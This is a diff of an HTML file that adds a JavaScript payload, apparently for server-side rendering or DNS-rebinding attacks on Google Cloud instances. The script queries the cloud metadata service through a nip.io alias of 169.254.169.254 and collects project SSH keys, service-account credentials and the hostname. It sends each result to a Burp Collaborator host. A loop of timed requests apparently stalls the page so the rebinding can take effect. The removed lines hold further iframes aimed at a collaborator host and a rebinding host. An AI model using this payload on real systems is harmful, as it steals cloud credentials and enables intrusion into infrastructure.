@@ -1,3 +1,38 @@
-<h1>google</h1>
-<iframe src="https://1dfe7q6vipvpwlvtto3y8bxik9qzeo.burpcollaborator.net/hx01"></iframe>
-<iframe src="http://make-1.1.1.1-rebind-169.254.169.254-rr.1u.ms/latest/"></iframe>
+<script>
+var logTimeServer = 'xijolcvagvjhy98wv4ihj4r5ewkm8b.burpcollaborator.net';
+var attackServer = '169.254.169.254.nip.io';
+
+function log(data) {
+    var sreq = new XMLHttpRequest();
+    sreq.open('GET', 'http://' + logTimeServer + ':5000/log?msg=' + encodeURI(data), true);
+    sreq.send();
+}
+
+function get(url) {
+    try {
+        var req = new XMLHttpRequest();
+        req.open('GET', url, false);
+        req.setRequestHeader('X-Google-Metadata-Request', 'True');
+        req.send(null);
+        if(req.status == 200)
+            return req.responseText;
+        else
+            return '[failed status=' + req.status + ']';
+    } catch(err) {
+        log(err);
+    }
+    return null;
+}
+
+log('Triggered in ' + window.location.href);
+
+for(var i = 0; i < 60; ++i) {
+    log('Loop ' + i);
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://' + logTimeServer + ':5000/', false);
+    req.send();
+}
+log('SSH Keys: ' + get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json'));
+log('Service Accounts: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json'));
+log('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));
+</script>
